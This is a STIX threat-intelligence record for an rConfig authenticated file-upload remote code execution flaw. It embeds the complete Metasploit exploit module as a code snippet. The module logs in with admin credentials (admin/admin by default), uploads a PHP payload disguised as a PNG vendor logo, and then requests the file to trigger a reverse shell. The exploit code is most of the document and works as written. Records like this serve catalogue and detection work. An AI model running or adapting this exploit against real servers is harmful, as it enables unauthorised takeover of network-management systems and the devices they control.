{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--00d82da3-97f0-4306-aaa2-8ac84fcb5b96",
    "created": "2024-08-14T17:01:20.156336Z",
    "modified": "2024-08-14T17:01:20.156341Z",
    "name": "rConfig Vendors Auth File Upload RCE",
    "description": " This module allows an attacker with a privileged rConfig account to start a reverse shell due to an arbitrary file upload vulnerability in `/lib/crud/vendors.crud.php`. Then, the uploaded payload can be triggered by a call to `images/vendor/<payload_file>.php`  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/rconfig_vendors_auth_file_upload_rce.rb",
            "external_id": "rconfig_vendors_auth_file_upload_rce.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'rConfig Vendors Auth File Upload RCE',\n        'Description' => %q{\n          This module allows an attacker with a privileged rConfig account to start a reverse shell\n          due to an arbitrary file upload vulnerability in `/lib/crud/vendors.crud.php`.\n          Then, the uploaded payload can be triggered by a call to `images/vendor/<payload_file>.php`\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'MURAT \u015eEKER', # Exploit-db\n          'VISHWARAJ BHATTRAI', # Exploit-db\n          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module\n        ],\n        'References' => [\n          ['EDB', '49665'],\n          ['EDB', '49783']\n        ],\n        'Platform' => [ 'php' ],\n        'Arch' => ARCH_PHP,\n        'Privileged' => false,\n        'DisclosureDate' => '2021-03-17',\n        'Targets' => [\n          [ 'rConfig <= 3.9.6', {}]\n        ],\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        },\n        'DefaultOptions' => {\n          'SSL' => true,\n          'RPORT' => 443\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username of the admin account', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password of the admin account', 'admin']),\n      OptString.new('TARGETURI', [true, 'The base path of the rConfig server', '/'])\n    ]\n  end\n\n  def authenticate\n    r = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login.php'),\n      'keep_cookies' => true\n    })\n\n    fail_with Failure::Unreachable \"Target #{RHOST} could not be reached.\" unless r\n\n    r = send_request_cgi!(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'lib/crud/userprocess.php'),\n      'headers' => {\n        'Origin' => full_uri(''),\n        'Referer' => \"#{full_uri}/login.php\"\n      },\n      'keep_cookies' => true,\n      'vars_post' => {\n        'user' => datastore['USERNAME'],\n        'pass' => datastore['PASSWORD'],\n        'sublogin' => '1'\n      }\n    )\n\n    fail_with Failure::Unreachable \"Target #{RHOST} could not be reached.\" unless r\n\n    if r.body.to_s.include?('Invalid')\n      fail_with Failure::BadConfig, 'The admin credentials given are incorrect'\n    end\n\n    unless r.headers.include?('location')\n      fail_with Failure::UnexpectedReply, 'Unexpected reply as auth redirection didn\\'t work'\n    end\n\n    print_good 'We successfully logged in !'\n  end\n\n  def check\n    r = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login.php')\n    })\n\n    if r&.code == 200\n\n      version = r.body.to_s.match(/Version (\\d*.\\d*.\\d*)/)\n      if version && version[1]\n        print_good(version[1] + ' of rConfig found !')\n        unless Rex::Version.new(version[1]) <= Rex::Version.new('3.9.6')\n          return CheckCode::Detected('Only versions <= 3.9.6 are vulnerable !')\n        end\n\n        return CheckCode::Appears('Vulnerable version of rConfig found !')\n      else\n        return CheckCode::Safe('Version of rConfig not found !')\n      end\n    else\n      CheckCode::Unknown(\"Can't access the rConfig web interface !\")\n    end\n  end\n\n  def exploit\n    cookie_jar.clear\n    authenticate\n    filename = \"#{Rex::Text.rand_text_alpha_lower(5..12)}.php\"\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(Rex::Text.rand_text_alpha(8..12), nil, nil, 'form-data; name=\"vendorName\"')\n    post_data.add_part(payload.encoded, 'image/png', nil, \"form-data; name='vendorLogo'; filename=#{filename}\")\n    post_data.add_part('add', nil, nil, 'form-data; name=\"add\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"editid\"')\n\n    print_status(\"Uploading file \\'#{filename}\\' containing the payload...\")\n\n    r = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/lib/crud/vendors.crud.php'),\n      'headers' => {\n        'Origin' => full_uri('')\n      },\n      'keep_cookies' => true,\n      'data' => post_data.to_s,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\"\n    )\n\n    if r&.code == 302\n      register_file_for_cleanup(filename)\n      print_status('Triggering the payload ...')\n      send_request_cgi(\n        'method' => 'GET',\n        'keep_cookies' => true,\n        'uri' => normalize_uri(target_uri.path, \"/images/vendor/#{filename}\")\n      )\n    else\n      fail_with Failure::Unknown \"Wasn't able to upload the payload file\"\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-03-17",
    "x_mitre_platforms": [
        "[ 'php' ]"
    ]
}